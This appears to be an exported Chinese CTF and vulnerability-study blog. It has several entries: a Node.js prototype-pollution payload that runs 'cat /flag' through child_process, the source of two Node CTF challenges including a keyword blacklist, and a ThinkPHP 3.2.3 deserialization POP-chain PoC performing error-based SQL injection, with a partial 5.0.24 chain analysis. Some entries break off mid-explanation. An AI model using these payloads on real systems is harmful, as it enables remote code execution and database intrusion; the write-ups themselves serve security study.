<p><img src="https://s2.loli.net/2022/01/16/wrh9qlGVKS8zom1.png"></p>
<p>在info目录下有个模板渲染可以ssti，接下来看outputFunction是不是可控的</p>
<p><img src="https://s2.loli.net/2022/01/16/gqkzP4evFtE1A3D.png"></p>
<p>在action路由发现clone函数，而且克隆的是req.body是我们可控的</p>
<p>playload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;lua&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="attr">&quot;Submit&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>在action目录下传入，访问info目录就能下载到源码</p>
]]></content>
  </entry>
  <entry>
    <title>329</title>
    <url>/2022/03/29/329/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h1><p>node沙盒逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">var randomstring = require(&quot;randomstring&quot;);</span><br><span class="line">var express = require(&quot;express&quot;);</span><br><span class="line">var &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = require(&quot;vm2&quot;);</span><br><span class="line">var fs = require(&quot;fs&quot;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">var flag = require(&quot;./config.js&quot;).flag</span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, function(req, res) &#123;</span><br><span class="line">    res.header(&quot;Content-Type&quot;, &quot;text/plain&quot;);</span><br><span class="line"></span><br><span class="line">    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span><br><span class="line">    eval(&quot;var flag_&quot; + randomstring.generate(64) + &quot; = \&quot;hitcon&#123;&quot; + flag + &quot;&#125;\&quot;;&quot;)</span><br><span class="line">    if (req.query.data &amp;&amp; req.query.data.length &lt;= 12) &#123;</span><br><span class="line">        var vm = new VM(&#123;</span><br><span class="line">            timeout: 1000</span><br><span class="line">        &#125;);</span><br><span class="line">        console.log(req.query.data);</span><br><span class="line">        res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, function() &#123;</span><br><span class="line">    console.log(&quot;listening on port 3000!&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在node.js里</p>
<h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var app = express();</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">var http = require(&#x27;http&#x27;);</span><br><span class="line">var pug = require(&#x27;pug&#x27;);</span><br><span class="line">var morgan = require(&#x27;morgan&#x27;);</span><br><span class="line">const multer = require(&#x27;multer&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));</span><br><span class="line">app.use(morgan(&#x27;short&#x27;));</span><br><span class="line">app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#x27;/uploads&#x27;)))</span><br><span class="line">app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#x27;/template&#x27;)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res) &#123;</span><br><span class="line">    var action = req.query.action?req.query.action:&quot;index&quot;;</span><br><span class="line">    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + &#x27;/template/&#x27;+ action +&#x27;.pug&#x27;);</span><br><span class="line">    var html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/file_upload&#x27;, function(req, res)&#123;</span><br><span class="line">    var ip = req.connection.remoteAddress;</span><br><span class="line">    var obj = &#123;</span><br><span class="line">        msg: &#x27;&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;</span><br><span class="line">        obj.msg=&quot;only admin&#x27;s ip can use it&quot;</span><br><span class="line">        res.send(JSON.stringify(obj));</span><br><span class="line">        return </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[0].path, function(err, data)&#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            obj.msg = &#x27;upload failed&#x27;;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype +&quot;/&quot;;</span><br><span class="line">            var file_name = req.files[0].originalname</span><br><span class="line">            var dir_file = __dirname + file_path + file_name</span><br><span class="line">            if(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    obj.msg = &quot;file type error&quot;;</span><br><span class="line">                    res.send(JSON.stringify(obj));</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: &#x27;upload success&#x27;,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                obj.msg = &#x27;upload failed&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(JSON.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/source&#x27;, function(req, res) &#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&#x27;/core&#x27;, function(req, res) &#123;</span><br><span class="line">    var q = req.query.q;</span><br><span class="line">    var resp = &quot;&quot;;</span><br><span class="line">    if (q) &#123;</span><br><span class="line">        var url = &#x27;http://localhost:8081/source?&#x27; + q</span><br><span class="line">        console.log(url)</span><br><span class="line">        var trigger = blacklist(url);</span><br><span class="line">        if (trigger === true) &#123;</span><br><span class="line">            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                http.get(url, function(resp) &#123;</span><br><span class="line">                    resp.setEncoding(&#x27;utf8&#x27;);</span><br><span class="line">                    resp.on(&#x27;error&#x27;, function(err) &#123;</span><br><span class="line">                    if (err.code === &quot;ECONNRESET&quot;) &#123;</span><br><span class="line">                     console.log(&quot;Timeout occurs&quot;);</span><br><span class="line">                     return;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(&#x27;data&#x27;, function(chunk) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;catch (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">function blacklist(url) &#123;</span><br><span class="line">    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;];</span><br><span class="line">    var arrayLen = evilwords.length;</span><br><span class="line">    for (var i = 0; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        const trigger = url.includes(evilwords[i]);</span><br><span class="line">        if (trigger === true) &#123;</span><br><span class="line">            return true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var server = app.listen(8081, function() &#123;</span><br><span class="line">    var host = server.address().address</span><br><span class="line">    var port = server.address().port</span><br><span class="line">    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>题目给了源码</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/05/26/THinkPHP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="THINKPHP反序列化漏洞复现"><a href="#THINKPHP反序列化漏洞复现" class="headerlink" title="THINKPHP反序列化漏洞复现"></a>THINKPHP反序列化漏洞复现</h1><h2 id="3-2-3"><a href="#3-2-3" class="headerlink" title="3.2.3"></a>3.2.3</h2><p>先找__destruct函数</p>
<p>在imagick.class.php发现可以利用的destory函数</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527124030.png"></p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527124338.png"></p>
<p>img是我们可控的，所以我们可以调用所以类中的destory函数，再全局找destroy函数</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527125443.png"></p>
<p>同样这里的handle也是可控的，我们可以调用全局的delete方法，再去找delete方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">       <span class="variable">$pk</span>   =  <span class="keyword">$this</span>-&gt;pk;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$options</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">           <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>]))</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(is_numeric(<span class="variable">$options</span>)  || is_string(<span class="variable">$options</span>)) &#123;</span><br><span class="line">           <span class="comment">// 根据主键删除记录</span></span><br><span class="line">           <span class="keyword">if</span>(strpos(<span class="variable">$options</span>,<span class="string">&#x27;,&#x27;</span>)) &#123;</span><br><span class="line">               <span class="variable">$where</span>[<span class="variable">$pk</span>]     =  <span class="keyword">array</span>(<span class="string">&#x27;IN&#x27;</span>, <span class="variable">$options</span>);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="variable">$where</span>[<span class="variable">$pk</span>]     =  <span class="variable">$options</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$options</span>            =  <span class="keyword">array</span>();</span><br><span class="line">           <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]   =  <span class="variable">$where</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 分析表达式</span></span><br><span class="line">       <span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]    =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       <span class="variable">$options</span> =  <span class="keyword">$this</span>-&gt;_parseOptions(<span class="variable">$options</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]))&#123;</span><br><span class="line">           <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;        </span><br><span class="line">       <span class="keyword">if</span>(is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>]))&#123;</span><br><span class="line">           <span class="variable">$pkValue</span>            =  <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]   =   implode(<span class="string">&#x27;,&#x27;</span>,<span class="keyword">$this</span>-&gt;modelList);</span><br><span class="line">       <span class="variable">$options</span>[<span class="string">&#x27;using&#x27;</span>]   =   <span class="keyword">$this</span>-&gt;getTableName();</span><br><span class="line">       <span class="keyword">if</span>(<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;_before_delete(<span class="variable">$options</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;        </span><br><span class="line">       <span class="variable">$result</span>  =    <span class="keyword">$this</span>-&gt;db-&gt;delete(<span class="variable">$options</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$result</span>) &#123;</span><br><span class="line">           <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pkValue</span>)) <span class="variable">$data</span>[<span class="variable">$pk</span>]   =  <span class="variable">$pkValue</span>;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;_after_delete(<span class="variable">$data</span>,<span class="variable">$options</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 返回删除记录个数</span></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里要求option[where]要等于1=1，并且会去调用db中的delete，而且db是可控的</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527132252.png"></p>
<p>可以利用这个执行sql语句进行sql注入</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;where&#x27;</span>=&gt;<span class="string">&#x27;1=1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;table&#x27;</span>=&gt;<span class="string">&#x27;mysql.user where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#&#x27;</span></span><br><span class="line"></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527141052.png"></p>
<p>sql报错说明能执行sql语句</p>
<h2 id="5-0-24"><a href="#5-0-24" class="headerlink" title="5.0.24"></a>5.0.24</h2><p>同样先找_destruct</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527160307.png"></p>
<p>调用了close和removeFiles两个方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527161424.png"></p>
<p>close没什么用</p>
<p>看看removefiles</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527162211.png"></p>
<p>可以用file_exists函数触发__tostring，接下来是找tostring函数</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527162647.png"></p>
<p>tostring会调用tojson方法，我们跟进</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527162757.png"></p>
<p>有个toarray，我们继续跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$item</span>    = [];</span><br><span class="line">       <span class="variable">$visible</span> = [];</span><br><span class="line">       <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">       <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 过滤属性</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;visible)) &#123;</span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">           <span class="variable">$data</span>  = array_intersect_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">           <span class="variable">$data</span>  = array_diff_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">               <span class="comment">// 关联模型对象</span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (is_array(<span class="variable">$val</span>) &amp;&amp; reset(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">               <span class="comment">// 关联模型数据集</span></span><br><span class="line">               <span class="variable">$arr</span> = [];</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                   <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// 模型属性</span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                   <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                       <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr();</span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                   <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527165315.png"></p>
<p>这里$value是可控我们就可以去触发__call方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527172816.png"></p>
<p>这里会调用call_user_func_array方法</p>
<p>接下来就是怎么给value赋值</p>
<p><img src="/.com//Users\rangaork\AppData\Roaming\Typora\typora-user-images\image-20220527173503530.png" alt="image-20220527173503530"></p>
<p>value是由getRelationData赋值的</p>
<p>跟进</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527173703.png"></p>
<p>在满足if条件的时候value的值由parent决定</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527174005.png"></p>
<p>可控</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527174114.png"></p>
<p>可控</p>
<p>参数是由relation方法决定的<img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527174435.png"></p>
<p>我们跟进,relation可控设置成geterror</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527175012.png"></p>
<p>这样就都可控了</p>
<p>接下来就是过value的判断了</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527175232.png"></p>
<p>modelRelation要有getBindAttr函数</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220527175525.png"></p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601144133.png"></p>
<p>OneToOne类中存在bindattr方法，但是该类是一个抽象类,无法直接用,我们要找一个继承这个抽象类的类</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601144306.png"></p>
